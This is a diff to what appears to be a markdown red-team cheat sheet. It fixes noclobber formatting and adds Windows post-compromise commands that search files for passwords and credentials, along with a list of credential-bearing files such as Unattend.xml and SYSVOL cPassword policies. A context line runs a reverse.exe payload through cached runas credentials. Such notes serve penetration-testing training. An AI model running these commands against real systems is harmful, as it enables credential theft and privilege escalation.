@@ -38,9 +38,9 @@ The "no clobber" environment variable helps prevent the use of ">" for redirecti
 
 For blue team, this could be an interesting tactic. Set the option on all blue team accounts so that if one is compromised and used by attacking team, the attacking team might be confused when trying to write with ">" if they are not familiar with noclobber.
 
-&nbsp;&nbsp;&nbsp;&nbsp;<code>set -o noclobber</code> *prevents use of > to overwrite or append to files *
+&nbsp;&nbsp;&nbsp;&nbsp;<code>set -o noclobber</code> *prevents use of > to overwrite or append to files*
 
-&nbsp;&nbsp;&nbsp;&nbsp;<code>set +o noclobber</code> *allows use of > to overwrite or append to files *
+&nbsp;&nbsp;&nbsp;&nbsp;<code>set +o noclobber</code> *allows use of > to overwrite or append to files*
 
  ### Writing files
  There are many executables that can write files that may avoid some of the standard monitoring a defending team may put in place. Check out the following resources that list typical OS native commands for living off the land that support file writing:
@@ -137,4 +137,41 @@ You can cache creds through runas on windows systems which will allow anyone to 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>cmdkey /list</code>
 &nbsp;&nbsp;&nbsp;&nbsp;<code>runas /savecred /user:admin C:\PrivEsc\reverse.exe</code>*if you find the admin account for example, run it like this*
 
+### Windows post compromise manual enum
 
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>dir /s *pass* == *.config</code> *searches for 'pass' in all config files*
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>findstr /si password *.xml *.ini *.txt</code> *searches for 'password' in multiple files*
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>Findstr /simp string \\share\location\*.config</code> *searches for a string in all .config files in all directories*
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>dir /s *pass* == *cred* == *vnc* == *.config*</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>findstr /si password *.xml *.ini *.txt</code>
+
+### Other useful windows files to check
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>c:\sysprep.inf</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>c:\sysprep\sysprep.xml</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>%WINDIR%\Panther\Unattend\Unattended.xml</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>%WINDIR%\Panther\Unattended.xml</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>sysvol policy files containing cPassword on a domain controller</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>%SYSTEMROOT%\SYSVOL\sysvol</code>
+ 
+&nbsp;&nbsp;&nbsp;&nbsp;<code>Services\Services.xml: Element-Specific Attributes</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>Printers\Printers.xml: SharedPrinter Element</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>Drives\Drives.xml: Element-Specific Attributes</code>
+ 
+&nbsp;&nbsp;&nbsp;&nbsp;<code>DataSources\DataSources.xml: Element-Specific Attributes</code>
+
+&nbsp;&nbsp;&nbsp;&nbsp;<code>\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies</code>
